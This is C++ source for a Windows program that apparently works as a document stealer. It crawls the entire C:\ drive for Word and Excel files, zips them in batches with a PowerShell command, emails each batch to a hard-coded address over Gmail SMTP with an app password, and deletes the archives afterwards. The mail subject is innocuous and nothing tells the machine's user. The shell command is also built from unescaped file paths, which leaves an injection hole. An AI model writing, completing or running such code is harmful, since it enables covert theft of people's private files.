#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <cstdlib>
#include <curl/curl.h>
#pragma comment(lib, "libcurl.lib")

using namespace std;
namespace fs = filesystem;

// Config
constexpr uintmax_t MAX_FILE_SIZE = 24990000;
const string MAIL_ADDRESS = "x";
const string MAIL_SUBJECT = "File Attachment Retrieval";
const string APP_PASSWORD = "x";

// Structs
struct FileEntry {
    string path;
    uintmax_t size;
};


string getDesktopPath() {
    char* home = nullptr;
    size_t len = 0;
    errno_t err = _dupenv_s(&home, &len, "USERPROFILE");
    if (err == 0 && home != nullptr) {
        string desktopPath = string(home) + "\\Desktop\\";
        free(home);
        return desktopPath;
    } else {
        return "C:\\Users\\Public\\Desktop\\"; // Fallback path
    }
}

vector<FileEntry> findDocs(const string& root) {
    vector<FileEntry> files;
    for (const auto& entry : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file()) {
            string ext = entry.path().extension().string();
            if ((ext == ".docx" || ext == ".xlsx")) {
                files.push_back({ entry.path().string(), entry.file_size() });
            }
        }
    }
    return files;
}

vector<vector<FileEntry>> sliceFiles(const vector<FileEntry>& files) {
    vector<vector<FileEntry>> slices;
    vector<FileEntry> current;
    uintmax_t size = 0;
    for (const auto& f : files) {
        if (size + f.size > MAX_FILE_SIZE && !current.empty()) {
            slices.push_back(current);
            current.clear();
            size = 0;
        }
        current.push_back(f);
        size += f.size;
    }
    if (!current.empty()) slices.push_back(current);
    return slices;
}


void zipFiles(const std::vector<FileEntry>& files, const std::string& zipName) {
    std::string fileList;
    for (const auto& file : files) {
        fileList += "\"" + file.path + "\",";
    }
    if (!fileList.empty()) fileList.pop_back();
    std::string cmd = "powershell.exe Compress-Archive -Path " + fileList + " -DestinationPath \"" + zipName + "\" -Force";
    system(cmd.c_str());
}


void sendZip(const string& zipPath) {
    CURL* curl = curl_easy_init();
    if (!curl) return;

    struct curl_slist* recipients = NULL;
    recipients = curl_slist_append(recipients, MAIL_ADDRESS.c_str());

    curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, MAIL_ADDRESS.c_str());
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
    curl_easy_setopt(curl, CURLOPT_USERNAME, MAIL_ADDRESS.c_str());
    curl_easy_setopt(curl, CURLOPT_PASSWORD, APP_PASSWORD.c_str());
    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

    struct curl_mime* mime = curl_mime_init(curl);
    struct curl_mimepart* part;

    // Body
    part = curl_mime_addpart(mime);
    curl_mime_data(part, "Attached zip file.", CURL_ZERO_TERMINATED);

    // Attachment
    part = curl_mime_addpart(mime);
    curl_mime_filedata(part, zipPath.c_str());
    curl_mime_filename(part, fs::path(zipPath).filename().string().c_str());

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
    }
    curl_slist_free_all(recipients);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}


   
int main() {
    string scan_dir = "C:\\";
    auto files = findDocs(scan_dir);
    if (files.empty()) {
        cout << "No files found." << endl;
        return 0;
    }
    auto slices = sliceFiles(files);
    int idx = 0;
    for (const auto& slice : slices) {
        string zipName = "docs_" + to_string(idx++) + ".zip";
        zipFiles(slice, zipName);
        sendZip(zipName);
        fs::remove(zipName);
    }
    return 0;
}


